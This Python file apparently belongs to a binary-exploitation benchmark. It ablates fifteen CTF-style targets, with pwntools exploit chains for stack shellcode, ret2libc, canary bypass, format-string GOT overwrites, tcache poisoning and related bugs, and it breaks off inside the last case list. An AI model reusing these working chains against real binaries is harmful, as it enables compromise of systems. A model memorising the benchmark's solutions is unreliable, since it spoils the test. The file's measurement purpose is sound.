#!/usr/bin/env python3
"""Ablation suite for the round-2 (held-out) benchmark corpus.

`benchmark/corpus_r2_reference/ablation.py` is the corpus author's own
ablation suite. It is DEFECTIVE by construction: each case drives ONLY the
ablated chain and asserts the flag is absent, catching EOFError into
`out = ""`. There is no positive control running through the identical
driver path, so a broken driver, a changed prompt string, or a read timeout
is silently indistinguishable from a genuinely blocked step -- all 15
drivers could be broken and this would still report a clean pass.

This file is the round-1 `benchmark/ablation/ablate.py` pattern applied to
round 2: ONE parametrised chain function per target, whose DEFAULT keyword
arguments reproduce the hand-verified reference exploit exactly (the
positive control), and each ablation is that SAME function with one keyword
flipped. If the chain function itself is broken, the positive control fails
first and the target is reported NOT MEASURABLE -- a "BLOCKED" verdict can
therefore never be an artifact of broken harness code. Every byte the
target ever emits is accumulated (see `Rec`) so a flag cannot be missed
just because it scrolled past in an earlier read.

Verdicts
--------
  BLOCKED               flag absent with the step removed -> the step is load-bearing
  *** NOT BLOCKED ***   flag STILL appears with the step removed -> the target
                        does not measure that step
  RELAXATION             a deliberately-expected NOT-BLOCKED probe: a documented
                        detail that is NOT in fact required. Recorded for honesty,
                        not hidden. Flagged if it turns out to be blocked after all.

Usage
-----
    python3 benchmark/ablation/ablate_r2.py                        # all 15 targets
    python3 benchmark/ablation/ablate_r2.py --case 04 --case 12    # a subset
    python3 benchmark/ablation/ablate_r2.py --list                 # list the cases
    python3 benchmark/ablation/ablate_r2.py --no-rebuild           # keep current flags

Paths resolve from this file's own location, so it runs from any working
directory. `--corpus-root` / `--manifest` default to corpus_r2 /
corpus_r2.yaml and can be overridden for a later round.

Exit status 0 means every ablation FAILED to produce the flag -- the passing
result. 1 means a chain step turned out to be unnecessary, i.e. a corpus
defect. 2 means the run could not measure something: unbuilt corpus, missing
flag.txt, bad --corpus-root, a failed positive control, or a target whose
discovery step did not resolve.
"""
import argparse
import os
import re
import sys
import time
import warnings
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

os.environ.setdefault("TERM", "xterm")
warnings.filterwarnings("ignore")

BENCH = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BENCH))
import run_bench as rb  # noqa: E402

from pwn import ELF, context, fmtstr_payload, p32, p64, process, u64  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

IO_TIMEOUT = 3.0

DEFAULT_CORPUS_DIR_R2 = BENCH / "corpus_r2"
DEFAULT_CORPUS_YAML_R2 = BENCH / "corpus_r2.yaml"


# --------------------------------------------------------------------------- #
# plumbing (reused verbatim from benchmark/ablation/ablate.py)
# --------------------------------------------------------------------------- #
class Rec:
    """Tube wrapper that remembers everything the target emitted.

    An ablation must not be scored BLOCKED merely because the flag scrolled past
    in an earlier read, so every byte received is accumulated.
    """

    def __init__(self, p):
        self.p = p
        self.seen = bytearray()

    def _keep(self, data: bytes) -> bytes:
        self.seen += data
        return data

    def recvuntil(self, delim, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recvuntil(delim, **kw))

    def recvline(self, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recvline(**kw))

    def recvn(self, n, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recvn(n, **kw))

    def recv(self, n, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recv(n, **kw))

    def recvrepeat(self, t=IO_TIMEOUT):
        return self._keep(self.p.recvrepeat(t))

    def send(self, data):
        self.p.send(data)

    def sendline(self, data):
        self.p.sendline(data)

    def sendlineafter(self, delim, data, **kw):
        # Implemented (not forwarded) so the awaited bytes are captured by
        # recvuntil above -- a flag printed before this delimiter must not
        # be able to escape the accumulated log.
        self.recvuntil(delim, **kw)
        self.sendline(data)

    def close(self):
        try:
            self.p.close()
        except Exception:
            pass


@dataclass
class Target:
    """One corpus target, freshly built with a secret flag."""
    slug: str
    binary: str
    target_dir: str
    flag: bytes

    def elf(self) -> ELF:
        return ELF(self.binary, checksec=False)

    def proc(self) -> Rec:
        return Rec(process(self.binary, cwd=self.target_dir))


def finish(r: Rec) -> bytes:
    """Drain whatever is left and return everything the target ever emitted."""
    try:
        r.recvrepeat(IO_TIMEOUT)
    except Exception:
        pass
    r.close()
    return bytes(r.seen)


def run_chain(fn: Callable, t: Target, kw: dict) -> tuple[bytes, str]:
    """Run a chain variant. A crash/EOF is a legitimate outcome, not an error:
    'the exploit stopped working' is exactly what an ablation should produce."""
    r = None
    try:
        r = fn(t, **kw)
        return finish(r), ""
    except Exception as e:  # EOFError, timeout, parse failure on a dead process
        out = finish(r) if isinstance(r, Rec) else b""
        return out, f"{type(e).__name__}: {str(e)[:90]}"


@dataclass
class Case:
    name: str
    why: str
    kw: dict = field(default_factory=dict)
    # False == "I expect the flag to STILL appear"; a documented detail that is
    # not actually load-bearing. Recorded honestly rather than hidden.
    expect_blocked: bool = True


# --------------------------------------------------------------------------- #
# 01_stack_shellcode_relay -- relay-copy overflow, no protections at all
# --------------------------------------------------------------------------- #
def chain_01(t, *, use_leak=True, overwrite_rip=True, include_shellcode=True,
             post_rip=True):
    OFFSET = 104  # buf[96] + saved rbp[8]
    from pwn import asm, shellcraft
    sc = asm(shellcraft.amd64.linux.sh())
    r = t.proc()
    r.recvuntil(b"buf @ ")
    buf = int(r.recvline().strip(), 16)
    if not use_leak:
        buf = 0x7FFD_0000_0000  # ASLR moves buf every run -- this is what a guess costs
    r.recvuntil(b"shellcode> ")

    if not overwrite_rip:
        payload = sc.ljust(64, b"\x90")            # shellcode present, RIP intact
    elif not include_shellcode:
        payload = b"A" * OFFSET + p64(buf + OFFSET + 8)
    elif post_rip:
        payload = b"A" * OFFSET + p64(buf + OFFSET + 8) + sc
    else:
        # Shellcode INSIDE buf, immediately abutting the return-address slot
        # (not past it), jump target at its own start. rsp after `ret` sits
        # right past that slot, so as the shellcode's own push instructions
        # (execve's argv/envp setup) run, rsp decrements straight back into
        # the not-yet-executed tail of the very shellcode it's running --
        # corrupting itself before the syscall fires (empirically: the
        # process dies with a broken pipe before "cat flag.txt" is even
        # sent). Placing it at buf's *start* instead, with a NOP sled after
        # it, does NOT reproduce this -- there is enough headroom on this
        # target's 96-byte buffer for the pushes to land harmlessly in the
        # sled, so that placement is not a valid ablation here.
        sc_off = OFFSET - len(sc)
        payload = b"A" * sc_off + sc + p64(buf + sc_off)
    r.send(payload)
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_01 = [
    Case("no_shellcode", "return address set, but no shellcode written",
         {"include_shellcode": False}),
    Case("no_rip_overwrite", "shellcode written, saved RIP left alone",
         {"overwrite_rip": False}),
    Case("no_stack_leak", "same payload shape, guessed stack address (no leak)",
         {"use_leak": False}),
    Case("shellcode_in_buffer", "shellcode before the saved RIP instead of after",
         {"post_rip": False}),
]


# --------------------------------------------------------------------------- #
# 02_ret2plt_strcat_system -- ret2plt, runtime-built "/bin/sh", no leak
# --------------------------------------------------------------------------- #
def chain_02(t, *, align_ret=True, set_rdi=True, call_system=True,
             correct_sh_buf=True):
    OFFSET = 72
    elf = t.elf()
    from pwn import ROP
    rop = ROP(elf)
    pop_rdi = elf.symbols["pop_rdi_gadget"]
    bare_ret = rop.find_gadget(["ret"])[0]
    sh_buf = elf.symbols["sh_buf"] if correct_sh_buf else elf.symbols["pop_rdi_gadget"]

    words = []
    if align_ret:
        words.append(bare_ret)
    if set_rdi:
        words += [pop_rdi, sh_buf]
    if call_system:
        words.append(elf.plt["system"])

    r = t.proc()
    r.recvuntil(b"name: ")
    r.sendline(b"hi")
    r.recvuntil(b"cmd> ")
    r.send(b"A" * OFFSET + b"".join(p64(x) for x in words))
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_02 = [
    Case("no_alignment_ret", "drop the 16-byte stack-alignment ret -> movaps in do_system",
         {"align_ret": False}),
    Case("no_rdi_setup", "call system() without loading rdi",
         {"set_rdi": False}),
    Case("no_system_call", "set rdi to sh_buf but never call system()",
         {"call_system": False}),
    Case("wrong_rdi_pointer", "call system() with a non-shell address",
         {"correct_sh_buf": False}),
]


# --------------------------------------------------------------------------- #
# 03_pie_write_leak_ret2libc -- raw 8-byte self-leak + GOT leak -> ret2libc
# --------------------------------------------------------------------------- #
def chain_03(t, *, rebase_pie=True, use_libc_leak=True, do_second_round=True,
             final_system=True):
    OFFSET = 88
    elf = t.elf()
    libc = ELF(elf.libc.path, checksec=False)

    r = t.proc()
    r.recvline()  # banner
    self_leak = r.recvn(8)
    r.recvline()  # trailing newline

    base = u64(self_leak) - elf.symbols["vuln"]
    addrs = {
        "pop_rdi": elf.symbols["pop_rdi_gadget"],
        "pop_rsi_rdx": elf.symbols["pop_rsi_rdx_gadget"],
        "write_plt": elf.plt["write"],
        "puts_got": elf.got["puts"],
        "vuln": elf.symbols["vuln"],
    }
    if rebase_pie:
        addrs = {k: v + base for k, v in addrs.items()}
    # else: link-time (un-rebased) addresses -- the leak was taken but never applied

    if not do_second_round:
        payload1 = b"A" * OFFSET
        payload1 += p64(addrs["pop_rdi"]) + p64(1)
        payload1 += p64(addrs["pop_rsi_rdx"]) + p64(addrs["puts_got"]) + p64(8)
        payload1 += p64(addrs["write_plt"])
        r.send(payload1)
        return r

    payload1 = b"A" * OFFSET
    payload1 += p64(addrs["pop_rdi"]) + p64(1)
    payload1 += p64(addrs["pop_rsi_rdx"]) + p64(addrs["puts_got"]) + p64(8)
    payload1 += p64(addrs["write_plt"])
    payload1 += p64(addrs["vuln"])
    r.send(payload1)

    leak = r.recvn(8)
    puts_addr = u64(leak)
    libc.address = (puts_addr - libc.symbols["puts"]) if use_libc_leak else 0

    r.recvn(8)   # round-2 self-leak, unused
    r.recvline()

    if not final_system:
        return r

    system_addr = libc.symbols["system"]
    binsh_addr = next(libc.search(b"/bin/sh\x00"))

    payload2 = b"A" * OFFSET
    payload2 += p64(addrs["pop_rdi"]) + p64(binsh_addr)
    payload2 += p64(system_addr)
    r.send(payload2)
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_03 = [
    Case("pie_leak_not_applied", "take the raw self-leak but never rebase gadgets on it",
         {"rebase_pie": False}),
    Case("libc_leak_not_applied", "leak puts@got but compute system() without the base",
         {"use_libc_leak": False}),
    Case("no_second_round", "leak everything, never loop back into vuln() for round 2",
         {"do_second_round": False}),
    Case("leaks_only", "do both leaks and re-enter vuln(), never call system()",
         {"final_system": False}),
]


# --------------------------------------------------------------------------- #
# 04_canary_relay_bypass -- canary leaked indirectly through relay_buf
# --------------------------------------------------------------------------- #
def chain_04(t, *, use_leaked_canary=True, do_overflow=True, target_win=True,
             stage1_len=64):
    elf = t.elf()
    win = elf.symbols["win"]
    ret_fixer = win + (0x4013c3 - 0x40138d)  # alignment-fixing tail-ret of win()

    r = t.proc()
    r.recvuntil(b"Name: ")
    r.send(b"A" * stage1_len)
    r.recvuntil(b"Relay: ")
    canary = r.recvn(8)
    if not use_leaked_canary:
        canary = p64(0xDEAD_BEEF_DEAD_BE00)  # canary-shaped, but not this process's

    if not do_overflow:
        return r

    ret_to = win if target_win else 0x4141_4141_4141_4141
    r.recvuntil(b"Message: ")
    payload = b"B" * 64        # buf
    payload += b"G" * 8        # 8-byte compiler alignment gap: uninspected
    payload += canary          # recovered canary, must match exactly
    payload += b"R" * 8        # saved rbp: uninspected
    payload += p64(ret_fixer)
    payload += p64(ret_to)
    r.send(payload)
    return r


CASES_04 = [
    Case("canary_not_leaked", "overflow with a zero-guess instead of the relayed leak",
         {"use_leaked_canary": False}),
    Case("leak_only", "leak the canary through relay_buf, never overflow",
         {"do_overflow": False}),
    Case("wrong_return_target", "restore the canary but return somewhere other than win()",
         {"target_win": False}),
    Case("short_stage1_write", "send 8 bytes instead of the full 64 before the relay",
         {"stage1_len": 8}, expect_blocked=False),
]


# --------------------------------------------------------------------------- #
# 05_fmtstr_pie_leak -- %N$p leak of a spilled self-pointer defeats PIE
# --------------------------------------------------------------------------- #
def _fmt05_probe(t, idx: int):
    r = t.proc()
    r.recvuntil(b"name: ")
    r.sendline(b"%%%d$p" % idx)
    line = r.recvline().strip()
    try:
        val = int(line, 16) if line.startswith(b"0x") else None
    except ValueError:
        val = None
    return val, r


def find_leak_index(t) -> int:
    """Sweep %N$p and settle on the index a real solve would use: the first
    value whose implied PIE base actually makes the overflow reach win()."""
    vuln_off = t.elf().symbols["vuln"]
    win_off = t.elf().symbols["win"]
    for idx in range(6, 60):
        value, r = _fmt05_probe(t, idx)
        try:
            if value is None or value <= vuln_off:
                continue
            base = value - vuln_off
            # A real PIE base is page-aligned.
            if base & 0xFFF:
                continue
            win_addr = base + win_off
            ret_fixer = base + 0x1320
            r.recvuntil(b"buf: ")
            r.sendline(b"A" * 232 + p64(ret_fixer) + p64(win_addr))
            if t.flag in finish(r):
                return idx
        finally:
            r.close()
    raise RuntimeError("no confirmed PIE-base index in %6$..%59$")


def chain_05(t, *, index=None, leak_base=True, do_overflow=True, target_win=True,
             offset=232):
    elf = t.elf()
    idx = index if index is not None else t.notes["leak_index"]

    value, r = _fmt05_probe(t, idx)
    if leak_base and value is None:
        raise RuntimeError(f"%{idx}$p printed no hex value to use as the leak")
    base = (value - elf.symbols["vuln"]) if leak_base else 0
    win_addr = base + elf.symbols["win"] if target_win else 0x4141_4141_4141_4141
    ret_fixer = base + 0x1320

    if not do_overflow:
        return r
    r.recvuntil(b"buf: ")
    payload = b"A" * offset + p64(ret_fixer) + p64(win_addr)
    r.sendline(payload)
    return r


CASES_05 = [
    Case("no_pie_leak", "overflow with base guessed as 0 (link-time win() address)",
         {"leak_base": False}),
    Case("leak_only", "leak the base, never overflow",
         {"do_overflow": False}),
    Case("wrong_return_target", "apply the real leak but return somewhere other than win()",
         {"target_win": False}),
    Case("short_second_stage", "232 bytes is the true offset; 8 bytes short misses the saved RIP",
         {"offset": 224}),
]


# --------------------------------------------------------------------------- #
# 06_fmtstr_short_write -- %hn writes the exact magic 0x1337 into auth_level
# --------------------------------------------------------------------------- #
def chain_06(t, *, do_write=True, addr_first=False, correct_magic=True,
             correct_addr=True):
    AUTH_MAGIC = 0x1337
    elf = t.elf()
    auth_addr = elf.symbols["auth_level"]
    if not correct_addr:
        auth_addr += 8   # a plausible-looking but wrong global address

    magic = AUTH_MAGIC if correct_magic else 0x1338

    r = t.proc()
    r.recvuntil(b"msg: ")
    if not do_write:
        payload = b"%1$p %2$p %3$p just reading, no %hn here"
    else:
        fmt = b"%%6$%dc%%8$hn" % magic
        pad = b"A" * (16 - len(fmt))
        if addr_first:
            payload = p64(auth_addr) + fmt + pad   # NUL in the address stops printf parsing
        else:
            payload = fmt + pad + p64(auth_addr)
    r.sendline(payload)
    return r


CASES_06 = [
    Case("no_format_write", "read-only format string -- no %hn directive at all",
         {"do_write": False}),
    Case("address_before_directive", "address first -> its embedded NUL stops printf parsing",
         {"addr_first": True}),
    Case("wrong_magic_value", "%hn writes 0x1338 instead of the required 0x1337",
         {"correct_magic": False}),
    Case("wrong_target_address", "%hn writes to auth_level+8 instead of auth_level",
         {"correct_addr": False}),
]


# --------------------------------------------------------------------------- #
# 07_static_ret2syscall -- raw execve() ROP, static binary, no leak
# --------------------------------------------------------------------------- #
def chain_07(t, *, overwrite_rip=True, frame_execve=True, include_full_chain=True):
    OFFSET = 88
    elf = t.elf()
    shell_path = elf.symbols["shell_path"]

    POP_RDI = 0x401eef
    POP_RSI = 0x409f5e
    POP_RDX_RBX = 0x485bab
    POP_RAX = 0x44ff07
    SYSCALL = 0x401ca4

    r = t.proc()
    r.recvuntil(b"input> ")

    if not overwrite_rip:
        r.sendline(b"hi")
        r.sendline(b"cat flag.txt")
        return r

    payload = b"A" * OFFSET
    payload += p64(POP_RDI) + p64(shell_path)
    payload += p64(POP_RSI) + p64(0)
    payload += p64(POP_RDX_RBX) + p64(0) + p64(0)
    if include_full_chain:
        payload += p64(POP_RAX) + p64(59 if frame_execve else 0)
        payload += p64(SYSCALL)
    r.sendline(payload)
    time.sleep(0.5)
    r.sendline(b"cat flag.txt")
    return r


CASES_07 = [
    Case("no_overflow", "benign input -- no ROP chain reaches the return address",
         {"overwrite_rip": False}),
    Case("no_syscall_stage", "load argument registers but never hit the syscall gadget",
         {"include_full_chain": False}),
    Case("wrong_syscall_number", "rax=0 (read) instead of 59 (execve)",
         {"frame_execve": False}),
]


# --------------------------------------------------------------------------- #
# 08_int_mul_overflow -- 8-bit truncation of len*8 bypasses the size check
# --------------------------------------------------------------------------- #
def chain_08(t, *, length=32, weaponize_chunk9=True, overwrite_rip=True,
             target_win=True):
    elf = t.elf()
    win_addr = elf.symbols["win"]
    ret_to = win_addr if target_win else 0x4141_4141_4141_4141
    ret_fixer = win_addr + 0xF

    r = t.proc()
    r.recvuntil(b"records (0-8, 8 bytes each): ")
    r.sendline(str(length).encode())

    # The (unsigned char)(len*8) check runs on the TARGET, not here: read
    # whichever of its two possible next lines actually shows up rather than
    # re-deriving the C truncation arithmetic in Python.
    banner = r.recvline()
    if b"loading" not in banner:
        return r   # "too many records" -- the check rejected this length outright

    if not weaponize_chunk9:
        # A plausible-but-naive contiguous payload: the loop's own reloaded
        # control variables (len/i, sitting between buf and the saved RIP)
        # get clobbered by plain filler and the loop self-terminates long
        # before reaching the return address.
        payload = b"A" * (length * 8)
        r.send(payload)
        return r

    chunk9 = b"\x00\x00\x00" + bytes([13]) + p32(10)
    payload = b"A" * 72        # iterations i=0..8: plain filler
    payload += chunk9          # iteration i=9: reloads len=13, i=10(->11)
    if overwrite_rip:
        payload += p64(ret_fixer)  # iteration i=11: retaddr slot
        payload += p64(ret_to)     # iteration i=12: fixer's own retaddr
    r.send(payload)
    return r


CASES_08 = [
    Case("legal_length", "ask for 3 records -> well within bounds, no overflow",
         {"length": 3}),
    Case("honest_oversize_length", "ask for 9 records (9*8=72>64, no wraparound needed) "
         "-> the check rejects it outright",
         {"length": 9}),
    Case("no_control_var_weaponization", "plain filler instead of the crafted chunk9 -> "
         "the loop clobbers its own len/i and self-terminates early",
         {"weaponize_chunk9": False}),
    Case("no_rip_overwrite", "control variables weaponized, but stop before the saved RIP",
         {"overwrite_rip": False}),
    Case("wrong_return_target", "overflow to a non-win() address",
         {"target_win": False}),
]


# --------------------------------------------------------------------------- #
# 09_heap_dangling_global -- free() + reuse-for-something-else + stale read
# --------------------------------------------------------------------------- #
def _menu09(r, choice):
    r.recvuntil(b"> ")
    r.sendline(str(choice).encode())


def chain_09(t, *, do_alloc=True, do_free=True, do_reuse=True, do_show=True,
             show_before_reuse=False):
    r = t.proc()
    if do_alloc:
        _menu09(r, 1)   # alloc_note(): placeholder, not the flag
        r.recvline()
    if do_free:
        _menu09(r, 2)   # free_note(): dangling note_ptr (the bug)
        r.recvline()
    if show_before_reuse:
        _menu09(r, 3)   # show_note() called BEFORE check_license() ever reuses the chunk
        r.recvline()
    if do_reuse:
        _menu09(r, 4)   # check_license(): reuses the freed chunk, writes the flag
        r.recvline()
    if do_show and not show_before_reuse:
        _menu09(r, 3)   # show_note(): reads through the dangling pointer
    return r


CASES_09 = [
    Case("no_free", "alloc then check-license then show -- no free(), so no chunk reuse",
         {"do_free": False}),
    Case("no_reuse", "alloc+free+show, skip check_license() -- nothing reused the chunk",
         {"do_reuse": False}),
    Case("show_before_reuse", "alloc+free+show, all BEFORE check_license() ever runs "
         "(reuse happens too late to matter)",
         {"show_before_reuse": True}),
]


# --------------------------------------------------------------------------- #
# 10_ret2csu_execve -- ret2csu register shuffle -> win(magic) via indirect call
# --------------------------------------------------------------------------- #
def chain_10(t, *, overwrite_rip=True, correct_magic=True, do_indirect_call=True):
    OFFSET = 88
    elf = t.elf()
    csu_gadget = elf.symbols["csu_gadget"]
    csu_gadget_call = elf.symbols["csu_gadget_call"]
    win_ptr = elf.symbols["win_ptr"]
    ret_fixer = elf.symbols["win"] + (0x4012f1 - 0x4012be)
    WIN_MAGIC = 0xCAFEBABE
    magic = WIN_MAGIC if correct_magic else 0xDEADBEEF

    r = t.proc()
    r.recvuntil(b"input> ")

    if not overwrite_rip:
        r.sendline(b"hi")
        return r

    payload = b"A" * OFFSET
    payload += p64(ret_fixer)
    payload += p64(csu_gadget)
    payload += p64(0)            # rbx
    payload += p64(0)            # rbp: junk
    payload += p64(0)            # r12 -> rsi
    payload += p64(0)            # r13 -> rdx
    payload += p64(magic)        # r14 -> edi (zero-extended)
    payload += p64(win_ptr)      # r15
    if do_indirect_call:
        payload += p64(csu_gadget_call)
        payload += p64(0) + p64(0) * 6 + p64(0)
    r.send(payload)
    return r


CASES_10 = [
    Case("no_rip_overwrite", "benign input -- no gadget chain reaches the return address",
         {"overwrite_rip": False}),
    Case("no_indirect_call", "load the registers via csu_gadget but never fall into "
         "csu_gadget_call's indirect call",
         {"do_indirect_call": False}),
    Case("wrong_magic_argument", "call win() through the real gadget pair with the wrong magic",
         {"correct_magic": False}),
]


# --------------------------------------------------------------------------- #
# 11_heap_overflow_tcache_poison -- heap overflow -> safe-linking poison ->
# dispatch_table hijack, gated by a count-gate filler chunk
# --------------------------------------------------------------------------- #
def _protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr


def _m11_create(r, idx, size):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendlineafter(b"size: ", str(size).encode())
    r.recvuntil(f"chunk[{idx}] @ ".encode())
    addr = int(r.recvline().strip(), 16)
    r.recvuntil(b"ok\n")
    return addr


def _m11_fill(r, idx, data):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendlineafter(b"len: ", str(len(data)).encode())
    r.sendlineafter(b"data: ", data)
    r.recvuntil(b"ok\n")


def _m11_delete(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.recvuntil(b"ok\n")


def _m11_call(r, idx):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"index: ", str(idx).encode())


def chain_11(t, *, count_gate_filler=True, mangle=True, correct_size_field=True,
             write_win=True, trigger_call=True):
    SIZE = 0x18
    elf = t.elf()
    win_addr = elf.symbols["win"]
    dispatch_table = elf.symbols["dispatch_table"]

    r = t.proc()
    mem_a = _m11_create(r, 0, SIZE)
    mem_b = _m11_create(r, 1, SIZE)
    if count_gate_filler:
        _m11_create(r, 2, SIZE)     # C: filler, freed first purely to keep count>0
        _m11_delete(r, 2)           # count 0->1

    _m11_delete(r, 1)               # count ->{1 or 2}; B becomes head

    poison = _protect_ptr(mem_b, dispatch_table) if mangle else dispatch_table
    # tcache_get() never re-validates the forged chunk-size field it pops --
    # see the corpus author's own reference docstring ("harmless if not
    # 0x21"). Forging it wrong is therefore expected to be a RELAXATION, not
    # a real gate; see CASES_11 below.
    header = p64(0x21) if correct_size_field else p64(0x20)
    payload = b"A" * SIZE + header + p64(poison)
    _m11_fill(r, 0, payload)        # overflow A into B's chunk header + fd field

    _m11_create(r, 3, SIZE)         # pops B -- head becomes &dispatch_table (if reachable)
    popped = _m11_create(r, 4, SIZE)  # pops the next head -- ideally &dispatch_table

    if popped != dispatch_table:
        return r                    # redirect failed; nothing further is meaningful

    if write_win:
        _m11_fill(r, 4, p64(win_addr))
    if trigger_call:
        _m11_call(r, 0)
    return r


CASES_11 = [
    Case("no_count_gate_filler", "free only B and poison it directly -- the pop that "
         "decodes the poison also drops count to 0, so dispatch_table is never reached",
         {"count_gate_filler": False}),
    Case("no_safe_linking_mangle", "store the raw target instead of PROTECT_PTR(pos, target)",
         {"mangle": False}),
    # NOT a defect: the reference exploit's own docstring documents this
    # field as unchecked by tcache_get() ("harmless if not 0x21"). Recorded
    # honestly as a relaxation rather than assumed and left untested.
    Case("wrong_size_field", "forge B's chunk-size field as 0x20 instead of 0x21 -- "
         "documented by the corpus author as unchecked by tcache_get()",
         {"correct_size_field": False}, expect_blocked=False),
    Case("no_got_write", "win the allocation but never write win() into the dispatch slot",
         {"write_win": False}),
    Case("no_handler_call", "write win() into the slot but never call_handler() it",
         {"trigger_call": False}),
]


# --------------------------------------------------------------------------- #
# 12_fmtstr_got_overwrite -- full 8-byte %hn GOT overwrite of puts@got
# --------------------------------------------------------------------------- #
def find_fmt_offset(t) -> int:
    """Sweep for the printf argument index whose value equals an 8-byte marker
    placed at the start of buf -- exactly the discovery a real solve does."""
    marker = b"MARKERAA"
    target_val = u64(marker)
    for idx in range(1, 30):
        r = t.proc()
        try:
            r.recvuntil(b"msg: ")
            r.sendline(marker + b"%%%d$p" % idx)
            line = r.recvline()
            m = re.search(rb"0x([0-9a-fA-F]+)", line)
            if m and int(m.group(1), 16) == target_val:
                return idx
        except Exception:
            pass
        finally:
            r.close()
    raise RuntimeError("no confirmed marker index in %1$..%29$")


def chain_12(t, *, do_write=True, correct_target=True, write_win_addr=True,
             trigger_puts=True):
    elf = t.elf()
    win_addr = elf.symbols["win"]
    puts_got = elf.got["puts"] if correct_target else elf.got["puts"] + 8
    offset = t.notes.get("fmt_offset", 6)

    r = t.proc()
    r.recvuntil(b"msg: ")

    if not do_write:
        r.sendline(b"%1$p.%2$p.%3$p (read-only, no %hn)")
        return r

    target_val = win_addr if write_win_addr else 0x4141414141414141
    payload = fmtstr_payload(offset, {puts_got: target_val}, write_size="short")
    r.sendline(payload)
    return r


CASES_12 = [
    Case("no_format_write", "read-only format string -- no %hn writes at all",
         {"do_write": False}),
    Case("wrong_got_target", "write the full 8 bytes to puts@got+8 instead of puts@got",
         {"correct_target": False}),
    Case("wrong_write_value", "overwrite puts@got with junk instead of win()'s address",
         {"write_win_addr": False}),
]


# --------------------------------------------------------------------------- #
# 13_off_by_one_retaddr_lsb -- fencepost off-by-one flips a function pointer's LSB
# --------------------------------------------------------------------------- #
def chain_13(t, *, cross_fencepost=True, lsb_delta=0):
    elf = t.elf()
    win_lsb = (elf.symbols["win"] + lsb_delta) & 0xFF

    r = t.proc()
    r.recvuntil(b"data (no newline): ")
    if cross_fencepost:
        payload = b"A" * 64 + bytes([win_lsb])
    else:
        payload = b"A" * 64        # exactly sizeof(buf); fencepost byte never written
    r.send(payload)
    return r


CASES_13 = [
    Case("exact_bound", "send exactly sizeof(buf)=64 bytes -- the fencepost byte is never written",
         {"cross_fencepost": False}),
    Case("wrong_lsb", "cross the fencepost but write a clearly-wrong LSB (win_addr-1)",
         {"lsb_delta": -1}),
    # NOT a defect, and worth recording rather than hiding: win()'s entry is
    # `f3 0f 1e fa` (endbr64). Landing ONE byte late (win_addr+1) starts
    # decoding at `0f 1e fa`, which x86 happens to decode as a harmless
    # 3-byte NOP -- re-syncing perfectly to the exact same push/mov/call
    # sequence as a clean entry, so the "exact byte" is not as load-bearing
    # as the ONE-BYTE-write framing implies for this +1 neighbor specifically.
    # Confirmed empirically: every OTHER wrong LSB tried (-1, +-0x10, +-0x40,
    # +0x80) crashes cleanly; only the immediate successor byte survives.
    Case("wrong_lsb_adjacent", "write win_addr+1's LSB -- lands mid-endbr64, which "
         "happens to decode as a self-realigning 3-byte NOP",
         {"lsb_delta": 1}, expect_blocked=False),
]


# --------------------------------------------------------------------------- #
# 14_oob_read_flag_array -- missing upper bound reads past arr into secret
# --------------------------------------------------------------------------- #
def chain_14(t, *, in_bounds_only=False, idx_start=8, idx_count=16):
    """`arr[idx]` is only ever leaked as a DECIMAL-printed integer on the
    wire -- the flag text itself never appears as a literal substring in
    anything the target prints. A real solve reconstructs it client-side
    (see the reference exploit's own struct.pack/split). To let the shared
    `t.flag in out` check apply uniformly across all 15 targets, the
    reconstructed bytes are folded into the Rec's own accumulated log --
    the identical decode step a genuine exploit performs, just recorded
    for scoring rather than printed to a human."""
    r = t.proc()
    words = []
    indices = range(8) if in_bounds_only else range(idx_start, idx_start + idx_count)
    for idx in indices:
        r.recvuntil(b"index: ")
        r.sendline(str(idx).encode())
        line = r.recvline()
        m = re.search(rb"=\s*(-?\d+)", line)
        if m:
            words.append(int(m.group(1)) & 0xFFFFFFFF)
    r.recvuntil(b"index: ")
    r.sendline(b"-1")
    if words:
        # Fold the raw reconstruction in whole -- do NOT truncate at the
        # first NUL byte. A leading garbage/misaligned word (e.g. arr[7]==7
        # packs as b"\x07\x00\x00\x00") has its own embedded NUL well before
        # any real flag bytes, so a naive split() would silently discard the
        # flag even when it is genuinely present a few bytes further in.
        r.seen += b"".join(p32(w) for w in words)
    return r


CASES_14 = [
    Case("in_bounds_only", "only ever query idx in [0,7] -- stays inside arr, never touches secret",
         {"in_bounds_only": True}),
    Case("wrong_start_offset", "query idx in [7,22] instead of [8,23] -- shifted by one word, "
         "but the flag (38 bytes) still fits whole inside the first 60 of the 64 misaligned "
         "bytes recovered, so containment alone doesn't catch the shift",
         {"idx_start": 7}, expect_blocked=False),
]


# --------------------------------------------------------------------------- #
# 15_ret2win_arg_gate -- overflow + pop-rdi gadget to satisfy win(magic)
# --------------------------------------------------------------------------- #
def chain_15(t, *, use_gadget=True, correct_magic=True, include_win=True,
             align_ret=True):
    OFFSET = 56
    elf = t.elf()
    win_addr = elf.symbols["win"]
    pop_rdi = elf.symbols["pop_rdi_gadget"]
    ret_fixer = pop_rdi + 5
    WIN_MAGIC = 0x1337
    magic = WIN_MAGIC if correct_magic else 0x1338

    r = t.proc()
    r.recvuntil(b"data> ")

    if not include_win:
        payload = b"A" * OFFSET
        r.send(payload)
        return r

    if not use_gadget:
        # Overwrite the return address directly with win(): rdi is whatever
        # garbage the ABI happens to hold, essentially never WIN_MAGIC.
        payload = b"A" * OFFSET + p64(win_addr)
        r.send(payload)
        return r

    payload = b"A" * OFFSET
    if align_ret:
        payload += p64(ret_fixer)
    payload += p64(pop_rdi)
    payload += p64(magic)
    payload += p64(win_addr)
    r.send(payload)
    return r


CASES_15 = [
